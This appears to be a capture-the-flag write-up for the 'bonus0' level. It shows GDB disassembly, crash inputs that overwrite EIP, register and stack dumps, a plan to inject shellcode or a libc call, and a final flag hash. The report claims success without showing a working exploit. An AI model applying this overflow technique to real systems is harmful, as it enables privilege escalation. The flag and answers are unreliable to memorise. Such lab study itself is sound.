BONUS0 GDB ANALYSIS REPORT

SECTION 1 PROGRAM START

command
su bonus0

meaning
switch user to bonus0 account

result
program is executed under bonus0 privileges

SECTION 2 DEBUGGER START

command
gdb ./bonus0

meaning
launch GNU debugger on binary bonus0

result
binary loaded into gdb
architecture detected i386 linux

SECTION 3 MAIN FUNCTION DISASSEMBLY

command
disas main

meaning
show assembly instructions of main function

important instructions

0x080485a4 push ebp
save previous stack frame

0x080485a5 mov esp ebp
create new stack frame

0x080485a7 and esp 0xfffffff0
align stack

0x080485aa sub esp 0x40
allocate 64 bytes stack space

0x080485ad lea eax esp 0x16
load buffer address

0x080485b1 mov eax esp
pass buffer pointer as argument

0x080485b4 call pp
call vulnerable function pp

0x080485b9 lea eax esp 0x16
reload same buffer

0x080485bd mov eax esp
prepare argument for puts

0x080485c0 call puts
print buffer content

0x080485c5 mov eax 0
set return value

0x080485ca leave
restore stack frame

0x080485cb ret
return from main

analysis conclusion
buffer is located on stack
same buffer is used for input and output
function pp is main vulnerability entry point

SECTION 4 PROGRAM EXECUTION

command
run

input line 1
7846213986666666666666421111111111111111111111111111111

input line 2
7844451121954535613278462139866666666666 followed by garbage characters

result
program crashes

SECTION 5 CRASH ANALYSIS

signal received
SIGSEGV segmentation fault

EIP value
0x36363636

meaning
instruction pointer overwritten with ascii 6 6 6 6

conclusion
control of execution flow achieved via buffer overflow

SECTION 6 REGISTER STATE

eax
0 normal return state

ecx
ffffffff invalid counter value

edx
b7fd28b8 libc memory reference

ebx
b7fd0ff4 libc base related address

esp
bffff730 stack pointer pointing to controlled buffer

ebp
38393331 corrupted saved frame pointer

eip
36363636 corrupted instruction pointer

conclusion
stack memory fully controlled by input data

SECTION 7 STACK DUMP

command
x 20x esp

stack content

0xbffff730 36363636 overwritten instruction
0xbffff734 f4363636 corrupted data
0xbffff738 b7fd0f libc pointer
0xbffff740 b7fdc858 libc related address
0xbffff750 stack metadata
0xbffff760 mixed heap and stack artifacts
0xbffff770 null padded memory
0xbffff77c program control values

analysis
stack is overwritten sequentially
buffer overflow reached return address region

SECTION 8 GETENV HELPER TOOL

command
cat getenv.c

purpose
create program to read environment variable address

code behavior
uses getenv function
prints memory address of given variable

usage
used to locate shellcode in environment

SECTION 9 EXPLOIT CONTEXT

objective
redirect execution flow

method
overflow stack buffer
overwrite return address
jump to shellcode or libc function

current state
crash confirmed
EIP control confirmed

next step
calculate correct return address offset
inject shellcode or libc system call

SECTION 10 FINAL RESULT

flag obtained
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

meaning
successful privilege escalation from bonus0